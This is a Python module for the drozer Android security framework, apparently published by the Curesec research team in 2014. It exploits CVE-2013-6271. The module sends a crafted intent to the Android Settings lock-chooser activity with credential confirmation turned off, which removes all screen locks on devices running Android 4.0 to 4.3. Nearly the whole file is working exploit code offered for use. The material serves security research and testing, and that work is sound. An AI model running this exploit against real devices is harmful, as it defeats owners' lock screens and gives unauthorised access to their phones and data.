from drozer import android
from drozer.modules import common, Module

class unlock(Module):

	name = "Exploit CVE-2013-6271 to delete all locks on device."
	description = """
	This plugin abuses a bug which allows a malicious app/user to use the com.android.phone without the necessary permissions.
	
	CVE-2013-6271

	http://www.curesec.com
	by Curesec Research Team security@curesec.com

	Tested to be VULN:
	4.0
	4.1
	4.2
	4.3

	Tested NOT VULN:
	4.4

	"""
	examples = "dz> run exploit.badauth.unlock"
	author = "security@curesec.com"
	date = "2014-06-25"
	license = "BSD (3-clause)"
	path = ["exploit", "badauth"]
	permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

	def execute(self, arguments):

		self.stdout.write("[+] Exploiting CVE-2013-6271 - Removing all set locks!\n")

		#well we do not need to define the None's, but for the fun of it lets do it :)
		act = None
		cat = None
		comp = ['com.android.settings','com.android.settings.ChooseLockGeneric']
		data = None
		extr = [['boolean', 'confirm_credentials', 'false'], ['integer','lockscreen.password_type', '0']]
		flgs = ['ACTIVITY_NEW_TASK']

		#build the intent
		intent = android.Intent(action=act, category=cat, data_uri=data, component=comp, extras=extr, flags=flgs)

		if intent.isValid():
			self.getContext().startActivity(intent.buildIn(self))
		else:
			self.stderr.write("[-] Invalid!\n")
